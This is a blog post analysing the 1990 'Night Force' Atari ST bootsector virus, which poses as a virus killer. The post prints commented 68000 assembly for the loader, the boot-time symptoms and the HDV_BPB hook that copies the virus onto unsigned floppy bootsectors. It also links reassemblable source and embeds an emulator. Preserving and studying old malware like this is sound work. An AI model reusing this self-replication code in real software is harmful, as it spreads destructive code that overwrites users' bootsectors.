Title: The Night Force Virus, the fake virus killer
Slug: NightForceVirus
Date: 2024-09-08 12:56
Location: San Francisco / US
Category: Atari ST, Virus
Lang: en
Author: shazz
status: published
summary: Short version for index and feeds

## Introduction

One way to stay below the radar and so undetected is to mimic the classic Atari ST virus killers, those bootsectors checking the registers and killing existing threats (the most famous one is probably the Medway Boys Protectors). This "trick" is pretty simple and may work with unexperienced users but overall this is a pretty lame trick.

But to respect the Virus Killers blueprint, the Night Force virus triggers his "symptoms" at boot: classic message, some nice colors and a little more hidden changing the date and keyboard rate. 

Then, goes silent and replicates on every bootsector it can.

You'll notice the message is XOR encoded, probably to avoid dumb copycats.

## High level specs

To summarize and before going into the details, here are the main characteristics of the Night Force Virus:

 - **executable bootsector** virus
 - Replace the original **HDV_BPB vector**
 - replicates itself on any disk where Getbpb() is called to retrieve the BPB, if the virus signature "ZOCH" in not present in the OEM bytes.
 - Show typical Virus killer symptoms at boot.
 - After decoding the message to display, the message is re-encoded in RAM.


## The details

Nothing really new in this fake virus killer. The symptoms part takes most of available bytes which did not let any room left for sme kind of reset resistance mechanism even if nearly 100 bytes are unused. Maybe it was really aiming to be a Virus killer?


### The Loader

The Bootcode starts at 0x1E, then as soon as copied in `DISKBUF` and being executed, it will

 - Copy itself a little after the disk buffer: `DISKBUFP + 0x600`
 - Compute the symptoms routine relocated address and jump to it

```asm
; ----------------------------------------------------------------------------------------------------------
; Pointers
; ----------------------------------------------------------------------------------------------------------

BOOTSECTOR_START        equ START-$1E

    org $1E

;BRA.S     START
;DC.B      'ZOCH',$00,$00,$BA,'i'
;DC.B      $1F,$00,$02,$02,$01,$00,$02,$80
;DC.B      $00,'h',$06,$F9,$03,$00,$0A,$00
;DC.B      $02,$00,$00,$00

START:
        LEA       BOOTSECTOR_START(PC),A0
        MOVEA.L   DISKBUFP.L,A1
        ADDA.L    #$600,A1
        MOVEA.L   A1,A2                             ; A2 = A1 = diskbuf+1536
        MOVE.W    #$7F,D0                           ; for d0 = 127 to 0
.copy:
        MOVE.L    (A0)+,(A1)+                       ; copy 512 bytes from A0= (diskbuf) to A1=diskbuf+1536
        DBF       D0,.copy

        LEA       SYMPTOMS(PC),A0                   ; A0 = SYMPTOMS
        LEA       BOOTSECTOR_START(PC),A1           ; A1 = BOOTSECTOR_START
        SUBA.L    A1,A0                             ; A0 = A0 - BOOTSECTOR_START
        ADDA.L    A0,A2                             ; A2 = diskbuf + 1536 + (SYMPTOMS - BOOTSECTOR_START)
        JMP       (A2)                              ; jump there! Symtoms relocated in diskbuf+1536
```

### The Symptoms routine

The symptoms routine:

 - Save the current `hdv_bpb` vector and set the new one `HDV_BPB_VECTOR`.
 - Change the ST palette,.
 - Change the keyboard rate (delay before one key and repeating keys).
 - Change the date to `1990-10-7` which is probably its creation date.
 - Decode the XOR-encoded message (key: `0x72`).
 - Use `CCONWS` Trap to display the message (with scrolling).
 - Re-encode the message.

```asm
; ---------------------------------------------------------------------------------------------------------- 
; SYMPTOMS (called onlyt at boot when the virus installs itself)
; ---------------------------------------------------------------------------------------------------------- 
SYMPTOMS:
        LEA       OLD_HDV_BPB_VECTOR(PC),A0         ; save old hdv_bpb vector
        MOVE.L    HDV_BPB.L,(A0)

        LEA       HDV_BPB_VECTOR(PC),A0
        MOVE.L    A0,HDV_BPB.L                      ; replace by new vector

        PEA       PALETTE_DATA(PC)                  ; palette = PALETTE
        MOVE.W    #6,-(sp)                          ; VOID Setpalette(word * palette)
        TRAP      #$E

        MOVE.W    #1,-(sp)                          ; rate = 1 - rate indicates the amount of time between repeats (in 50Hz ticks)
        MOVE.W    #$A,-(sp)                         ; delay = 10 - delay specifies the amount of time (in 50Hz ticks) before a key begins repeating
        MOVE.W    #$23,-(sp)                        ; WORD Kbrate( word delay, word rate ) : reads/modifies the keyboard repeat/delay rate.
        TRAP      #$E                               ; Xbios
        
        MOVE.W    #$1547,-(sp)                      ; date =  1990-10-7 - date is a bit array arranged as illustrated under Tgetdate(): Bits 15-9: YEars since 1980, Bits 8-5: Month, Bits 4-0: Date
                                                    ;         0001010-1010-00111
        MOVE.W    #$2B,-(sp)                        ; WORD Tsetdate( uword date ) : sets the current GEMDOS date.
        TRAP      #1                                ; Gemdos

        CLR.L     D0                                ; clear D0
        LEA       ENCODED_MESSAGE(PC),A0
        MOVE.L    A0,-(sp)                          ; str = A0
.loop_decode:
        MOVE.B    (A0),D0
        EORI.B    #CODEC,D0                         ; decode message using XOR and key CODEC ($72)
        MOVE.B    D0,(A0)+                          ; and replace character in (A0)
        TST.B     D0                                ; until d0 == 0
        BNE.S     .loop_decode

        MOVE.W    #9,-(sp)                          ; CCONWS( str )
        TRAP      #1
        ADDA.L    #$16,sp                           ; fix all stacks

        ; re-encode message in RAM... why not
        LEA       ENCODED_MESSAGE(PC),A0
.loop_encode:
        MOVE.B    (A0),D0
        EORI.B    #CODEC,D0
        MOVE.B    D0,(A0)+
        CMPI.B    #CODEC,D0
        BNE.S     .loop_encode

        RTS

; ----------------------------------------------------------------------------------------------------------
; data
; ----------------------------------------------------------------------------------------------------------
OLD_HDV_BPB_VECTOR:
        DC.L      $00FC0DE6

PALETTE_DATA:
        DC.B      $00,$00,$01,$20,$02,$20,$03,$20   ; palette colors 0-3
        DC.B      $04,$20,$05,$20,$06,$20,$07,$20   ; palette colors 4-7
        DC.B      $00,$70,$01,$11,$02,$22,$03,$33   ; palette colors 8-11
        DC.B      $04,$44,$05,$55,$06,$66,$07,$77   ; palette colors 12-15

ENCODED_MESSAGE:
        ; -THE NIGHT FORCE VIRUS BREAKER--BY ZOCH
        DC.B      $69,$2B,$52,$57,$5F,$26,$3A,$37
        DC.B      $52,$3C,$3B,$35,$3A,$26,$52,$34
        DC.B      $3D,$20,$31,$37,$52,$24,$3B,$20
        DC.B      $27,$21,$52,$30,$20,$37,$33,$39
        DC.B      $37,$20,$5F,$69,$2B,$50,$42,$69
        DC.B      $10,$45,$5F,$30,$2B,$52,$28,$3D
        DC.B      $31,$3A,$5F,$69,$3A,$69,$3E,$69
        DC.B      $3E,$69,$3E,$69,$3E,$69,$3E,$69
        DC.B      $3E,$69,$3E,$69,$3E,$75,$72,$00
    END
```

### The HDV_BPB vector

Now that the virus is installed in memory, and that the VBL routine has set the `hdv_bpb` vector, it will wait any call to BIOS `Getbpb()` which retrieves the `BPB` (Bios Parameter Block) of the floppy disk. 
This vector will:

 - Duplicate the Getbpb(dev) stack on `A6`.
 - Keep a copy of the device value and call the original vector.
 - Exit if the "ZOCH" signature is in the disk buffer OEM bytes.
 - Else, copy the bootsector branch and signature in the disk buffer.
 - Copy the bootcode in the disk buffer.
 - Use `Protobt` TRAP to make an executable bootsector from the disk buffer.
 - Use `Flopwr` TRAP to write the bootsector on the same device
 

```asm
; ----------------------------------------------------------------------------------------------------------
; HDV_BPB_VECTOR
; when Getpbp( dev ) is called
; Applications installing themselves here should exp
; be for the actual function call beginning at 4(sp)
; ----------------------------------------------------------------------------------------------------------    
HDV_BPB_VECTOR:
        LINK.W    A6,#$0                            ; copy SP on A6
        MOVE.W    $8(A6),-(sp)                      ; Save copy of dev on stack to be kept after old vector call

        MOVEA.L   OLD_HDV_BPB_VECTOR(PC),A0         ; get old vector in A0 
        JSR       (A0)                              ; call old vector
        ADDQ.L    #2,sp                             
        MOVEM.L   D0/A0/A1,-(sp)                    ; save D0,A0,A1 on stack

        MOVEA.L   DISKBUFP,A0                       ; A0 = diskbuf

        ; check signature, if there, do nothing
        CMPI.L    #BOOTSECTOR_SIGNATURE,$2(A0)      ; DC.W 'ZOCH'
        BEQ.W     DO_NOTHING

        ; write bootsector branch and OEM
        MOVE.L    #BOOTSECTOR_BRA,(A0)+          
        MOVE.L    #BOOTSECTOR_OEM,(A0)+              

        ADDA.L    #$16,A0                           ; advance to boot code in A0 ($16 + $8 = $1E)
        LEA       START(PC),A1                      ; advance to bootcode in A1
        MOVE.W    #$77,D0                           ; for d0 = 119 to 0
.copy:
        MOVE.L    (a1)+,(a0)+                       ; copy 480 bytes from DISKBUFP[bootcode at $1E]
        DBF       D0,.copy

        ; create executable bootsector
        MOVE.W    #1,-(sp)                          ; execflag = 1 (executable)
        MOVE.W    #$FFFF,-(sp)                      ; no change
        MOVE.L    #$FFFFFFFF,-(sp)                  ; serial
        MOVE.L    DISKBUFP.L,-(sp)                  ; buf = diskbuf
        MOVE.W    #$12,-(sp)                        ; PROTOBT
        TRAP      #$E                               ; Xbios

        MOVE.W    #1,-(sp)                          ; count: 1                   
        CLR.L     -(sp)                             ; side: 0 | track: 0
        MOVE.W    #1,-(sp)                          ; sector: 1  
        MOVE.W    8(A6),-(sp)                       ; dev of Getpbp( dev ) put on stack copy
        CLR.L     -(sp)                             ; rsrvd = 0
        MOVE.L    DISKBUFP.L,-(sp)                  ; buf = diskbuf
        MOVE.W    #9,-(sp)                          ; FLOPWR
        TRAP      #$E

        ADDA.L    #$22,sp                           ; fix both stacks
DO_NOTHING:
        MOVEM.L   (sp)+,A0-A1/D0
        UNLK      A6
        RTS
```

## Conclusion

This Night Force Virus was not the first one to use this old camouflage trick and in thie case not particularly well done. Except this "social engineering" feature, I guess it was fairly simple to detect by antiviruses and virus killers as the usual patterns are in place : `hdv_bpb` vector, calls to `Flopwr` and `Protobt` traps, not particularly hidden in RAM and no protection mechanisms.

At least I have appreciated the anti-hacking encoded and re-encoded message and the message display which looks good, with colors and scrolling.

As usual, you can download the full commented, and tested identical to the original virus after assembling with [vasm](http://www.compilers.de/vasm.html) here: [ZOCH.S]({attach}sources/ZOCH.S)


## Appendices

### Fun facts

 - In the UVK book, Richard wrote "To all intent and purpose this virus was written as an anti-virus. Unfortunately it copies itself across all bootsectors it finds with the exception of ones it finds itself on. This means that it will destroy any previous program in the bootsector, whether needed or another virus!". I wonder as it explicitly replicates (that most virus killers don't do) and does absolutely nothing to try to detect any virus. Not even an executable bootsector.
 - As one symptom is to set the current date to 1990-10-7, we can guess this is when it was created by Zoch.
 - The Night Force name probably comes from the palette used to show the message.

### Still to do

 - Nothing

## Run the virus!

{% from '/html/macros/emulator.html' import emulator %}
{{ emulator("ZOCH") }}